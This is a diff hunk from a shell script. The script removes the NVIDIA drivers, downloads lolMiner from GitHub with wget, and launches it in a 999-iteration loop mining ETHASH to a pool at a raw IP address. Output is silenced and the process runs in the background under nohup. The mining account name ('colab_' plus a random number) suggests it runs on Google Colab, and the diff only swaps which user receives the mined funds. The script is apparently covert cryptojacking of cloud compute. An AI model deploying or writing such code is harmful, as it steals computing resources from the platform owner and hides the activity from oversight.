@@ -85,7 +85,7 @@ sudo apt-get --purge remove "*nvidia*"
 sudo apt-get autoremove
 number_mining=$(echo $(shuf -i 1-9999 -n 1))
 wget -nv -c https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.42/lolMiner_v1.42_Lin64.tar.gz -O - | tar -xz
-wallet="./1.42/lolMiner --algo ETHASH --pool 3.215.245.39:443 --user sagemode.colab_$number_mining >/dev/null 2>&1 "
+wallet="./1.42/lolMiner --algo ETHASH --pool 3.215.245.39:443 --user prodent.colab_$number_mining >/dev/null 2>&1 "
 nohup $(for i in {1..999}; do $(echo $wallet); done) >/dev/null 2>&1 &
 
 clear
